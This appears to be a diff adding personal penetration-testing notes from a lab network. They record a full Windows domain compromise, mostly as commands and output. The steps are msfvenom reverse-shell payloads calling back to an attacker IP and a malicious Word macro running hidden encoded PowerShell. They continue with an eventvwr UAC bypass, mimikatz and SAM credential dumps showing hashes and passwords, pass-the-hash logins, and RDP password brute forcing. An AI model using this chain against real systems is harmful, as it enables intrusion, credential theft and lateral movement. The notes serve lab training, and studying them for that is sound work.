@@ -1,0 +1,162 @@
+# start from 10.11.1.21 SV-FILE01
+# found service
+ftp 
+	# only doc and docx will be accepted and executed
+	acc: editor
+	pwd: MyEditWork
+
+# generate payplad and format payload to fit macro injection
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.124 LPORT=443 -f hta-psh
+
+# making marco in doc word as marco only work on either doc or docm
+Sub AutoOpen()
+    MyMacros
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+
+    Str = Str+"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
+	.....
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+
+# send the document through ftp to get a shell from 10.11.1.22 SVCLIENT08 (the system shell hasn't been obtained yet)
+User Name    SID                                         
+============ ============================================
+svcorp\alice S-1-5-21-466546139-763938477-1796994327-1103
+
+Group Name                                 Type             SID          Attributes                                        
+========================================== ================ ============ ==================================================
+BUILTIN\Administrators                     Alias            S-1-5-32-544 Group used for deny only                          
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+
+# users on 10.11.1.22 
+Administrator
+alice
+defaultuser0
+offsec
+Public
+tris
+
+# PE Ref: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
+# comfirm UAC of the system is currently on 
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System                                                                      
+                                                                                                                                              
+	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System                                                                  
+	    ConsentPromptBehaviorAdmin	REG_DWORD    0x5  
+	    ...    
+
+	    EnableLUA					REG_DWORD    0x1
+	    ...
+
+	    PromptOnSecureDesktop		REG_DWORD    0x1  
+	    ...                                                                                                                                                                                                
+	                                                                                                                                              
+	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit                                                            
+	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\UIPI
+
+
+where /r C:\windows eventvwr.exe
+	C:\Windows\System32\eventvwr.exe
+	C:\Windows\SysWOW64\eventvwr.exe
+	C:\Windows\WinSxS\amd64_eventviewersettings_31bf3856ad364e35_10.0.14393.0_none_226c43821a65c869\eventvwr.exe
+	C:\Windows\WinSxS\wow64_eventviewersettings_31bf3856ad364e35_10.0.14393.0_none_2cc0edd44ec68a64\eventvwr.exe
+
+# comfirm eventvwr.exe is set to autoElevate
+strings64.exe -accepteula C:\Windows\System32\eventvwr.exe | findstr /i autoelevate
+    <autoElevate>true</autoElevate>
+
+# creat payload for getting system shell
+msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.124 LPORT=12345 -f exe -o shell.exe
+
+# download payplad, modify and compile
+git clone https://github.com/turbo/zero2hero.git
+nano UAC_bypass.c
+	# uncomment and update shell name
+	GetCurrentDirectory(MAX_PATH, curPath);
+	strcat(curPath, "\\shell.exe");
+x86_64-w64-mingw32-gcc UAC_bypass.c -o UAC_bypass
+
+# get system shell by running UAT_bypass.exe
+User Name    SID                                         
+============ ============================================
+svcorp\alice S-1-5-21-466546139-763938477-1796994327-1103
+
+Group Name                                 Type             SID          Attributes                                                     
+========================================== ================ ============ ===============================================================
+BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             
+
+
+# dump credentials by using mimikatz.exe and found plaintext password of alice for SV-DC01
+.\mimikatz_x64.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" > mimikatz_dump.txt
+	User Name         : alice
+	Domain            : svcorp
+	Logon Server      : SV-DC01
+	* Username : alice
+    * Domain   : svcorp
+    * NTLM     : 7f004ce6b8f7b2a3b6c477806799b9c0
+    * SHA1     : 42024899f39a57b4b8e2cc8a6135344c6d97f0b4
+    * DPAPI    : 61b2fe5324370982157e36116d6f2a4c
+    credman :
+    [00000000]
+    * Username : alice
+    * Domain   : alice
+    * Password : ThisIsTheUsersPassword01
+
+# dump sam, security and system files to get the hash
+reg.exe save hklm\sam c:\Users\alice\Documents\sam.save
+reg.exe save hklm\security c:\Users\alice\Documents\security.save
+reg.exe save hklm\system c:\Users\alice\Documents\system.save
+impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
+
+# dump credential
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* :1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+# PTH to access administrator account on 10.11.1.22 (can be used to login as admin on this machine)
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.22 cmd
+
+# PTH to access adminiistrator on 10.11.1.24 svclient73 by reusing the admin hash from .22
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.24 cmd
+
+# users on 10.11.1.24
+Administrator
+defaultuser0
+Offsec
+pete
+Public
+tris
+
+# dump credentials by using mimikatz.exe and found plaintext password of alice for SVCLIENT73
+.\mimikatz_x64.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" > mimikatz_dump.txt
+
+# dump sam, security and system files to get the hash
+reg.exe save hklm\sam c:\Users\Administrator\Documents\sam.save
+reg.exe save hklm\security c:\Users\Administrator\Documents\security.save
+reg.exe save hklm\system c:\Users\Administrator\Documents\system.save
+impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
+
+# generate a password list base on the alice password pattern
+crunch 24 24 -t ThisIsTheUsersPassword%% -o passwords.txt 
+
+# brute force and get the tris's password on DC01
+crowbar -b rdp -s 10.11.1.20/32 -u tris -C passwords.txt -v
+	RDP-SUCCESS : 10.11.1.20:3389 - tris:ThisIsTheUsersPassword22
+
+# brute force and get the pete's password on FILE01
+crowbar -b rdp -s 10.11.1.21/32 -u pete -C passwords.txt -v
+	RDP-SUCCESS : 10.11.1.21:3389 - pete:ThisIsTheUsersPassword19
+
+
+
+
